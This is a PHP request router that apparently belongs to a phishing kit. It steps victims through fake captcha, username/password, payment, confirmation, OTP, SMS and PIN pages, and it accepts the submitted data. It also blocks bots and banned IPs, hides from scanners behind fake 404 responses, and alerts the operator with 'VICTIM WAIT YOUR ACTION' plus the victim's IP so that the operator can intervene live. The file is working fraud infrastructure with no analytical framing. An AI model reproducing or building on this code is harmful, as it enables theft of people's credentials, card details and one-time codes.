<?php
include '../prevents/sub_anti.php';
include '../prevents/anti2.php';


$method = $_SERVER['REQUEST_METHOD'];

if ($method === 'GET') {
    // Handle GET requests
    require_once 'controller/viewsController.php';
    require_once "lang.php";

    
    antibotpw();
    BannedIP();
    update();

    $view = $_GET['view'];

    switch ($view) {
        case 'index':
            viewsHcaptcha();
            break;
        case 'main':
            viewsMain();
            break;
        case 'explain':
            viewsExplain();
            break;
        case 'otp':
            viewsOtp();
                break;
        case 'sms':
            viewsSms();
            break;
        case 'load':
            $ip = get_client_ip();
            $rezdata = "VICTIM WAIT YOUR ACTION IP : ".$ip;
            sendKey($rezdata);
            viewsLoad();
            break;
        case 'infoz':
            viewsInfoz();
            break;
        case 'pin':
            viewsPin();
            break;
        case 'pay':
            viewsPay();
            break;
        case 'UserPass':
            viewsUserPass();
            break;
        case 'confirm':
            viewsConf();
            break;
        case 'approv':
            viewsApprov();
            break;
        case 'badapprov':
            viewsBadApprov();
            break;
        case 'wait_approve':
            require_once 'views/wait_approve.php';
            break;
        default:
            // Handle unknown views or redirect to a 404 page
            die("HTTP/1.0 404 Not Found" );
            break;
    }

} elseif ($method === 'POST') {
    // Handle POST requests
    require_once 'controller/manageController.php';

    if (!isset($_SESSION['FIL212sD'])) {
        die("HTTP/1.0 404 Not Found" );
    }

    if (!empty($_POST['catch'])) {
        die("HTTP/1.0 404 Not Found" );
    }

    $action = $_POST['submit'];

    switch ($action) {
        case 'captcha':
            check();
            break;
        case 'page1':
            index();
            break;
        case 'page2':
            Explain();
            break;
        case 'page3':
            Infoz();
            break;
        case 'page4':
            Pay();
            break;
        case 'page5':
            Conf();
            break;
        case 'otp':
            Otp();
            break;
        case 'sms':
            Sms();
            break;
        case 'pin':
            Pin();
            break;
        default:
            // Handle unknown actions or redirect to a 404 page
            die("HTTP/1.0 404 Not Found" );  
            break;
    }

} else {
    die("HTTP/1.0 404 Not Found" ); 
}
?>
